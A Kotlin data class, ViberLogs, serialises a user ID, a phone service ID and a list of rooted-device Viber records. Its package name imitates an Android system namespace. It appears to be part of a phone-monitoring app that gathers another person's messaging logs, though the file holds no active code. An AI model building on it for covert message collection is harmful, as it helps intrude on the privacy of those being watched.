package com.android.services.models.im

import com.android.services.db.entities.ViberRooted
import com.google.gson.annotations.SerializedName

class ViberLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("viberLogs")
    var viberList: List<ViberRooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, viberUnrootedList: List<ViberRooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        viberList = viberUnrootedList
    }
}